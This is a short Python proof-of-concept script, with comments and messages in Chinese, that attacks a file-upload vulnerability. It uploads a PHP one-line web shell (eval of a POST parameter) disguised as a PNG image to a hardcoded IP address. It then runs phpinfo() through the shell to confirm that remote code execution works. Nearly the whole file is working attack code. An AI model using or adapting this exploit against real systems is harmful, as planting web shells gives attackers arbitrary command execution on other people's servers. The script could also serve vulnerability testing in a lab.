"""
文件上传 POC
"""
import requests


def upload_verify(url):
    header = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
        "Content-Type":"multipart/form-data; boundary=---------------------------28970434923832187097465538748"
    }
    payload1 = """-----------------------------28970434923832187097465538748
    Content-Disposition: form-data; name="upload_file"; filename="123.php"
    Content-Type: image/png
    
    <?php eval($_POST[cmd]);?>
    -----------------------------28970434923832187097465538748
    Content-Disposition: form-data; name="submit"
    
    
    -----------------------------28970434923832187097465538748--
    """
    res1 = requests.post(url, headers=header, data=payload1)
    # print(res1.text)
    img_path = 'uploads/123.php'
    if img_path in res1.text:
        print('文化上传成功')

    payload2 = {
        "cmd":"phpinfo();"
    }
    res2 = requests.post(url+img_path, data=payload2)
    if "PHP Version" in res2.text:
        print("%s 存在文件上传漏洞！" % url)
    else:
        print("%s 不存在文件上传漏洞！" % url)
if __name__ == '__main__':
    url = 'http://120.25.24.45:31626/'
    upload_verify(url)